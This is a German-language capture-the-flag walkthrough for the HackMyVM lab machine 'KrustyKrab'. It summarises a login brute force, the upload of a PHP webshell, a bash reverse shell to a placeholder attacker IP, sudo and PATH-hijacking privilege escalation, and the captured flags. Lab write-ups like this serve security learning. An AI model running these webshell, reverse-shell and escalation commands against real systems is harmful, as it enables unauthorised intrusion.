# KrustyKrab - HackMyVM Lösungsweg

![KrustyKrab VM Icon](KrustyKrab.png)

Dieses Repository enthält einen Lösungsweg (Walkthrough) für die HackMyVM-Maschine "KrustyKrab".

## Details zur Maschine & zum Writeup

*   **VM-Name:** KrustyKrab
*   **VM-Autor:** DarkSpirit
*   **Plattform:** HackMyVM
*   **Schwierigkeitsgrad (laut Writeup):** Mittel (Medium)
*   **Link zur VM:** [https://hackmyvm.eu/machines/machine.php?vm=KrustyKrab](https://hackmyvm.eu/machines/machine.php?vm=KrustyKrab)
*   **Autor des Writeups:** DarkSpirit
*   **Original-Link zum Writeup:** [https://alientec1908.github.io/KrustyKrab_HackMyVM/](https://alientec1908.github.io/KrustyKrab_HackMyVM/)
*   **Datum des Originalberichts:** 27. April 2025

## Verwendete Tools (Auswahl)

*   `arp-scan`
*   `nmap`
*   `curl`
*   `nikto`
*   `gobuster`
*   `wfuzz`
*   `vi/vim`
*   `grep`
*   `msfconsole` (für `ssh_enumusers`)
*   `hydra`
*   `python3` (insb. `requests`, `http.server`)
*   `ssh`
*   `exiftool`
*   `sudo`
*   `split` (Befehl)
*   `cat`
*   `find`
*   `at`
*   `wget`
*   `ghidra`
*   `strings`
*   `stegseek`
*   `xxd`
*   `md5sum`
*   `gcc`
*   Standard Linux-Befehle

## Zusammenfassung des Lösungswegs

Das Folgende ist eine gekürzte Version der Schritte, die unternommen wurden, um die Maschine zu kompromittieren, basierend auf dem bereitgestellten Writeup.

### 1. Reconnaissance (Aufklärung)

*   Die Ziel-IP `192.168.2.184` wurde mittels `arp-scan -l` identifiziert.
*   Ein `nmap`-Scan ergab offene Ports:
    *   **Port 22/tcp (SSH):** OpenSSH 9.2p1 Debian 2.
    *   **Port 80/tcp (HTTP):** Apache httpd 2.4.62 ((Debian)), Standard-Apache-Seite.
*   Der Hostname `krusty.hmv` wurde der IP `192.168.2.184` in der `/etc/hosts`-Datei des Angreifers zugeordnet.

### 2. Web Enumeration

*   Im Quelltext der Standard-Apache-Seite (`http://krusty.hmv/`) wurde ein HTML-Kommentar `` gefunden, der auf das Verzeichnis `/finexo/` hinwies.
*   `gobuster` auf `http://192.168.2.184/finexo/` fand:
    *   HTML-Seiten (`index.html`, `team.html`, etc.).
    *   PHP-Skripte: `login.php`, `test.php` (Status 500), `config.php` (Status 200, Size 0), `logout.php`.
    *   Verzeichnisse: `uploads/`, `dashboard/`, etc.
*   Auf der `team.html`-Seite wurden Benutzernamen enumeriert: `SpongeBob`, `PatrickStar`, `Squidward`, `Sandy`.
*   Der Versuch, SSH-Benutzer mit Metasploits `ssh_enumusers` zu enumerieren, schlug fehl (False Positives).
*   Ein SSH-Brute-Force-Angriff mit `hydra` wurde abgebrochen.

### 3. Initial Access als `spongebob` (auf `/finexo` Webanwendung)

1.  **Captcha-Umgehung und User Enumeration bei `login.php`:**
    *   Manuelle Tests auf `/finexo/login.php` zeigten unterschiedliche Fehlermeldungen für existierende ("Wrong Password" für `Spongebob`) und nicht existierende Benutzer ("User doesn't exit" für `sandy`).
    *   Der Captcha-Text konnte über einen separaten GET-Request (`?action=generateCaptcha`) bezogen werden.
2.  **Passwort-Brute-Force mit Python-Skript:**
    *   Ein Python-Skript wurde entwickelt, das die Captcha-Abfrage automatisierte und Passwörter für den Benutzer `Spongebob` testete.
    *   Das Passwort **`squarepants`** wurde für `Spongebob` gefunden.
3.  **Zugriff auf das Dashboard:**
    *   Mit `Spongebob:squarepants` wurde Zugriff auf `http://192.168.2.184/finexo/dashboard/` erlangt. Dort wurde ein Hinweis auf "Mantis" gefunden.
    *   SSH-Login als `spongebob` mit `squarepants` schlug fehl.

### 4. Proof of Concept (Webshell als `www-data`)

1.  **IDOR und Webshell-Upload (manipulierter Profil-Upload):**
    *   Über die Profilaktualisierungsfunktion (`/finexo/dashboard/update_profile.php`) konnte durch Manipulation des POST-Requests (mit Burp Suite) der Benutzerkontext auf `Administratro` geändert und gleichzeitig eine PHP-Webshell (`<?php system($_GET["cmd"]); ?>`) als `shell.php.jpg` hochgeladen werden. Das Passwort für `Administratro` wurde dabei auf `admin123` gesetzt.
2.  **RCE über Admin-Dashboard oder `test.php`:**
    *   Nach erfolgreichem Login als `Administratro:admin123` auf `/finexo/admin_dashborad/` (vermutlich `/finexo/admin_dashboard/`) wurde eine direkte Befehlseingabe-Funktion entdeckt.
    *   Alternativ (oder als ursprünglicher Plan) hätte die hochgeladene Shell über die verwundbare `test.php` (die einen `file`-Parameter akzeptiert, LFI-ähnlich) ausgeführt werden können: `test.php?file=uploads/SHELLNAME.jpg&cmd=id`.
3.  **Reverse Shell als `www-data`:**
    *   Über die Befehlseingabe im Admin-Dashboard wurde `nc` verwendet, um eine Bash-Reverse-Shell zum Angreifer aufzubauen:
        `/bin/bash -c 'bash -i >& /dev/tcp/ANGREIFER_IP/1234 0>&1'`
    *   Shell als `www-data` wurde erlangt.

### 5. Privilege Escalation

1.  **Von `www-data` zu `KrustyKrab`:**
    *   `sudo -l` als `www-data` zeigte: `(KrustyKrab) NOPASSWD: /usr/bin/split`.
    *   Mittels GTFOBins-Technik für `split` wurde eine Shell als `KrustyKrab` erlangt:
        `sudo -u KrustyKrab /usr/bin/split --filter=/bin/sh /dev/stdin`
2.  **Enumeration als `KrustyKrab`:**
    *   Im Home-Verzeichnis von `KrustyKrab` wurde `user.txt` gefunden und gelesen.
    *   In `config.php` der `/finexo`-Anwendung wurden MySQL-Zugangsdaten gefunden: `root:RootRootandRootyou` für die Datenbank `your_database`.
    *   Einloggen in MySQL bestätigte die Zugangsdaten und zeigte Klartext-Passwörter für Webanwendungs-Benutzer (`SpongeBob:admin`, `Administratro:admin123`).
    *   `sudo -l` als `KrustyKrab` zeigte: `(spongebob) NOPASSWD: /usr/bin/ttteeesssttt`.
3.  **Von `KrustyKrab` zu `spongebob`:**
    *   Das Binary `/usr/bin/ttteeesssttt` wurde heruntergeladen und mit Ghidra analysiert. Es stellte sich als ein Rätselspiel heraus, das bei korrekter Eingabe `system("/bin/bash -p");` ausführt.
    *   Die korrekte Eingabesequenz wurde durch Reverse Engineering der Logik und der internen Zutatenliste ermittelt.
    *   Durch Ausführen von `sudo -u spongebob /usr/bin/ttteeesssttt` und Eingabe der korrekten Sequenz wurde eine Shell als `spongebob` erlangt.
4.  **Enumeration als `spongebob`:**
    *   Die Mailbox `/var/mail/spongebob` enthielt Hinweise auf fehlgeschlagene `sudo`-Versuche von `spongebob`, einen Befehl `list` als `root` auszuführen.
    *   Im Home-Verzeichnis von `spongebob` wurden `key1` (enthielt `e1964798cfe86e914af895f8d0291812`) und `key2.jpeg` gefunden.
    *   `key2.jpeg` wurde heruntergeladen und analysiert (exiftool, stegseek – ohne direkten Erfolg).
    *   Die Kombination `echo -n "<Inhalt_key1><MD5_key2.jpeg>" | md5sum` ergab den Hash `7ac254848d6e4556b73398dde2e4ef82`.
5.  **Von `spongebob` zu `Squidward`:**
    *   Das Passwort für `Squidward` war der zuvor berechnete Hash (`7ac254848d6e4556b73398dde2e4ef82`). Mit `su Squidward` wurde der Benutzer gewechselt.
6.  **Von `Squidward` zu `root` (Path Hijacking):**
    *   Im Home-Verzeichnis von `Squidward` wurde das SUID-root-Binary `laststep` gefunden.
    *   Ghidra-Analyse von `laststep` zeigte, dass es `setuid(0); setgid(0); system("cat /etc/shadow");` ausführt.
    *   Ein bösartiges `cat`-Programm wurde erstellt (`#include <stdio.h> int main() { system("/bin/bash -p"); return 0; }`), kompiliert und auf das Zielsystem in ein von `Squidward` kontrollierbares Verzeichnis übertragen.
    *   Durch Setzen von `export PATH=.:$PATH` und Ausführen von `./laststep` wurde das bösartige `cat` anstelle von `/bin/cat` ausgeführt, was zu einer Root-Shell führte.

### 6. Flags

*   **User-Flag (`/home/KrustyKrab/user.txt`):**
    ```
    dcc8b0c111c9fa1522c7abfac8d1864b
    ```
*   **Root-Flag (`/root/root.txt`):**
    ```
    efe397e3897f0c19ef0150c2b69046a3
    ```

## Haftungsausschluss (Disclaimer)

Dieser Lösungsweg dient zu Bildungszwecken und zur Dokumentation der Lösung für die "KrustyKrab" HackMyVM-Maschine. Die Informationen sollten nur in ethischen und legalen Kontexten verwendet werden, wie z.B. bei CTFs und autorisierten Penetrationstests.
